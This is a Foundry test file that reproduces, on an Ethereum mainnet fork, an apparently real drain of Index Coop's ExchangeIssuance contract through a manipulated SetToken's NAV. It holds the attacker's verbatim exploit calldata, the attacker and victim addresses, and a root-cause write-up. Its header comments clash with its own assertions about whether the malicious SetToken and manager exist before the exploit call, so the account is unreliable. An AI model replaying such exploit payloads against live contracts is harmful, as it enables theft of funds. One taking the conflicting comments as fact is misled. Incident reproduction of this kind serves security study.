// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Index Coop ExchangeIssuance drain via attacker-crafted SetToken NAV manipulation.
//
// Incident tx : 0x7f45428df558fba1d19ab115effef8ecd1e6e05b491f02202b0815e47b8d658b
//   Ethereum mainnet block 25644621. The attacker EOA 0x0736930a signs three sequential txs
//   in this same block:
//     tx0 (nonce 0, CREATE)      -> deploys the orchestrator/"valuer" contract at
//                                   0x388a3Da3...994802.
//     tx1 (nonce 1, -> 0x388a..) -> setup: deploys the malicious SetToken (BHSET) at
//                                   0xf7c2d0a2...06948 through the real Set Protocol
//                                   SetTokenCreator, wires the attacker-controlled manager/hook
//                                   0x8f449d85...a26c58 and a custom NAV valuer, initialises the
//                                   BasicIssuanceModule + CustomOracleNavIssuanceModule.
//     tx2 (nonce 2, -> 0x388a..) -> THIS exploit call (calldata replayed below).
//   Forking at the tx2 hash makes foundry replay tx0 and tx1 first, so the orchestrator, the
//   SetToken and the manager already exist at the exact on-chain addresses before the drain.
//
// Root cause (attacker-deployed-contract on-chain state manipulation, NOT a compromised
// signer / admin key). Every privileged role in the flow -- the SetToken's manager, its
// pre-issue hook, and its NAV valuer -- is a contract the attacker deployed in this same
// block. No Index Coop key, no privileged EOA, and no signature is involved. Confirmed from
// the trace: the only externally-owned account in the call tree is the attacker EOA, and it
// merely calls its own orchestrator.
//   Index Coop's ExchangeIssuance.issueSetForExactToken trusts arbitrary SetToken state with
//   no lock between the quote read and the settlement transfer. It reads getComponents() and
//   getDefaultPositionRealUnit() to size the trade, but the SetToken's positionMultiplier was
//   inflated (~93.66x) mid-flow by the attacker's manager firing a fake NAV issue/redeem
//   valuation through the CustomOracleNavIssuanceModule. When BasicIssuanceModule.issue then
//   settles, it reads the inflated *real* units and pulls ExchangeIssuance's OWN component
//   inventory (LINK/UNI/AAVE/MKR/WBTC/HEX/BIT/USDC/WETH) into the SetToken -- a TOCTOU between
//   the units read for pricing and the units used for the transferFrom.
//
// Flow inside tx2 (all driven by the orchestrator 0x388a..):
//   1. Balancer flash-loans ~0.1089 WETH to the orchestrator.
//   2. Orchestrator seeds a fake BHS/WETH Uniswap pair and buys real basket components,
//      forwarding them to the manager 0x8f449d.. which NAV-issues 1e18 BHSET -> inflates
//      positionMultiplier.
//   3. Orchestrator approves 0.05 WETH and calls ExchangeIssuance.issueSetForExactToken(BHSET,
//      WETH, 0.05e18, 0). ExchangeIssuance settles against the inflated units and ships its own
//      component inventory into the SetToken, minting BHSET to the orchestrator.
//   4. Orchestrator redeems the BHSET, pulling the real components back to itself, unwinds and
//      repays the flash loan. The drained basket (~9.6K USD) stays in the orchestrator.
//
// Run:
//   forge test --contracts ./src/test/2026-07/ExchangeIssuance_exp.sol -vvv
//   (point the `mainnet` rpc alias at an ETH archive node)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract ExchangeIssuanceExp is Test {
    // Attacker EOA (tx.origin == msg.sender for the exploit call).
    address constant ATTACKER = 0x0736930aE35EAfEfa789f11Edf41d7B799e7c99d;
    // Attacker-deployed orchestrator / "valuer" -- the `to` of the exploit tx.
    address constant ORCH = 0x388a3Da33825E1F44Ac71b8FD543523cdF994802;
    // Victim: Index Coop ExchangeIssuance.
    address constant EXCHANGE_ISSUANCE = 0xc8C85A3b4d03FB3451e7248Ff94F780c92F884fD;
    // Attacker-deployed malicious SetToken (BHSET) and manager/hook.
    address constant SET_TOKEN = 0xF7C2D0a2Bf81BF803eD6E1d97c89Fe3B30B06948;
    address constant MANAGER = 0x8f449d85f728c1dd6596880BA28a0B80B6A26C58;

    bytes32 constant EXPLOIT_TX = 0x7f45428df558fba1d19ab115effef8ecd1e6e05b491f02202b0815e47b8d658b;

    // Basket components ExchangeIssuance held as inventory and that got drained into the
    // attacker's SetToken then redeemed out to the orchestrator.
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20 constant UNI = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 constant AAVE = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 constant MKR = IERC20(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2);
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 constant BIT = IERC20(0x1A4b46696b2bB4794Eb3D4c26f1c55F9170fa4C5);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Exact calldata of the exploit tx (selector 0x5d371673 + the full basket/units payload).
    bytes constant EXPLOIT_CALLDATA =
        hex"5d37167300000000000000000000000000000000000000000000000000000000"
        hex"0000006000000000000000000000000000000000000000000000000000000000"
        hex"000001a000000000000000000000000000000000000000000000000000000000"
        hex"000002e000000000000000000000000000000000000000000000000000000000"
        hex"00000009000000000000000000000000514910771af9ca656af840dff83e8264"
        hex"ecf986ca0000000000000000000000001f9840a85d5af5bf1d1762f925bdaddc"
        hex"4201f9840000000000000000000000007fc66500c84a76ad7e9c93437bfc5ac3"
        hex"3e2ddae90000000000000000000000009f8f72aa9304c8b593d555f12ef6589c"
        hex"c3a579a20000000000000000000000002260fac5e5542a773aa44fbcfedf7c19"
        hex"3bc2c599000000000000000000000000eef9f339514298c6a857efcfc1a762af"
        hex"84438dee000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead908"
        hex"3c756cc20000000000000000000000001a4b46696b2bb4794eb3d4c26f1c55f9"
        hex"170fa4c5000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce"
        hex"3606eb4800000000000000000000000000000000000000000000000000000000"
        hex"00000009000000000000000000000000a2107fa5b38d9bbd2c461d6edf11b11a"
        hex"50f6b974000000000000000000000000d3d2e2692501a5c9ca623199d38826e5"
        hex"13033a17000000000000000000000000d75ea151a61d06868e31f8988d28dfe5"
        hex"e9df57b4000000000000000000000000c2adda861f89bbb333c90c492cb83774"
        hex"1916a225000000000000000000000000bb2b8038a1640196fbe3e38816f3e67c"
        hex"ba72d94000000000000000000000000023d15edceb5b5b3a23347fa425846de8"
        hex"0a2e8e5c00000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000e12af1218b4e9272e9628d7c7dc6354d"
        hex"137d024e000000000000000000000000397ff1542f962076d0bfe58ea045ffa2"
        hex"d347aca000000000000000000000000000000000000000000000000000000000"
        hex"000000090000000000000000000000000000000000000000000000000054db16"
        hex"f0d96a580000000000000000000000000000000000000000000000000027dce0"
        hex"abc8c3e3000000000000000000000000000000000000000000000000001c6291"
        hex"40e49b60000000000000000000000000000000000000000000000000001a314e"
        hex"0016f1350000000000000000000000000000000000000000000000000008f216"
        hex"22e404680000000000000000000000000000000000000000000000000005800a"
        hex"44deb64400000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000003dd9f"
        hex"2742ae3d000000000000000000000000000000000000000000000000000312d4"
        hex"f0723110";

    function testExploit() public {
        // Fork at the exploit tx: foundry replays tx0 (deploy) and tx1 (setup) first, so the
        // orchestrator / SetToken / manager exist at their real addresses right before the drain.
        vm.createSelectFork("mainnet", EXPLOIT_TX);

        // The orchestrator was deployed by the replayed tx0; the SetToken and manager do NOT
        // exist yet -- the orchestrator creates them itself inside this exploit call.
        assertGt(ORCH.code.length, 0, "orchestrator not deployed by replayed tx0");
        assertEq(SET_TOKEN.code.length, 0, "SetToken should not exist before the exploit call");
        assertEq(MANAGER.code.length, 0, "manager should not exist before the exploit call");

        emit log_named_decimal_uint("ExchangeIssuance LINK before", LINK.balanceOf(EXCHANGE_ISSUANCE), 18);

        uint256 wethBefore = WETH.balanceOf(ORCH);
        uint256 linkBefore = LINK.balanceOf(ORCH);
        uint256 uniBefore = UNI.balanceOf(ORCH);
        uint256 aaveBefore = AAVE.balanceOf(ORCH);
        uint256 mkrBefore = MKR.balanceOf(ORCH);
        uint256 wbtcBefore = WBTC.balanceOf(ORCH);
        uint256 bitBefore = BIT.balanceOf(ORCH);
        uint256 usdcBefore = USDC.balanceOf(ORCH);

        // Replay the exploit call exactly: attacker EOA -> orchestrator, tx2 calldata verbatim.
        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = ORCH.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call reverted");

        // The malicious SetToken + manager were created by attacker code during the call: the
        // whole privilege chain (manager / pre-issue hook / NAV valuer) is attacker-deployed,
        // confirming on-chain state manipulation rather than a compromised signer / admin key.
        assertGt(SET_TOKEN.code.length, 0, "SetToken should be attacker-deployed in-call");
        assertGt(MANAGER.code.length, 0, "manager should be attacker-deployed in-call");

        uint256 wethGain = WETH.balanceOf(ORCH) - wethBefore;
        uint256 linkGain = LINK.balanceOf(ORCH) - linkBefore;
        uint256 uniGain = UNI.balanceOf(ORCH) - uniBefore;
        uint256 aaveGain = AAVE.balanceOf(ORCH) - aaveBefore;
        uint256 mkrGain = MKR.balanceOf(ORCH) - mkrBefore;
        uint256 wbtcGain = WBTC.balanceOf(ORCH) - wbtcBefore;
        uint256 bitGain = BIT.balanceOf(ORCH) - bitBefore;
        uint256 usdcGain = USDC.balanceOf(ORCH) - usdcBefore;

        emit log_string("--- attacker net component gain (orchestrator balance delta) ---");
        emit log_named_decimal_uint("WETH", wethGain, 18);
        emit log_named_decimal_uint("LINK", linkGain, 18);
        emit log_named_decimal_uint("UNI", uniGain, 18);
        emit log_named_decimal_uint("AAVE", aaveGain, 18);
        emit log_named_decimal_uint("MKR", mkrGain, 18);
        emit log_named_decimal_uint("WBTC", wbtcGain, 8);
        emit log_named_decimal_uint("BIT", bitGain, 18);
        emit log_named_decimal_uint("USDC", usdcGain, 6);

        // Value the drained basket in USDC using live Uniswap V2 quotes at the fork block (no
        // hardcoded prices), routing each token -> WETH -> USDC. This ties the on-chain gain to
        // the ~9.6K USD reported loss without trusting an off-chain price snapshot.
        uint256 usd6 = 0; // USDC has 6 decimals
        usd6 += _quoteToUsdc(address(LINK), linkGain);
        usd6 += _quoteToUsdc(address(UNI), uniGain);
        usd6 += _quoteToUsdc(address(AAVE), aaveGain);
        usd6 += _quoteToUsdc(address(MKR), mkrGain);
        usd6 += _quoteToUsdc(address(WBTC), wbtcGain);
        usd6 += _quoteToUsdc(address(BIT), bitGain);
        usd6 += _quoteWethToUsdc(wethGain);
        usd6 += usdcGain; // already USDC

        emit log_named_decimal_uint("drained basket value (USDC, incident-block quotes)", usd6, 6);

        // Net real-asset gain must be material and in the incident's magnitude (~9.6K USD; the
        // conservative getAmountsOut path prices the large positions with slippage, landing ~8.1K).
        assertGt(linkGain, 400e18, "expected LINK drain");
        assertGt(uniGain, 400e18, "expected UNI drain");
        assertGt(bitGain, 350e18, "expected BIT drain");
        assertGt(usd6, 6_000e6, "drained basket below incident magnitude");
        assertLt(usd6, 15_000e6, "drained basket above incident magnitude");
    }

    IUniswapV2Router constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function _quoteToUsdc(address token, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;
        address[] memory path = new address[](3);
        path[0] = token;
        path[1] = address(WETH);
        path[2] = address(USDC);
        uint256[] memory outs = ROUTER.getAmountsOut(amount, path);
        return outs[2];
    }

    function _quoteWethToUsdc(uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        uint256[] memory outs = ROUTER.getAmountsOut(amount, path);
        return outs[1];
    }
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory);
}
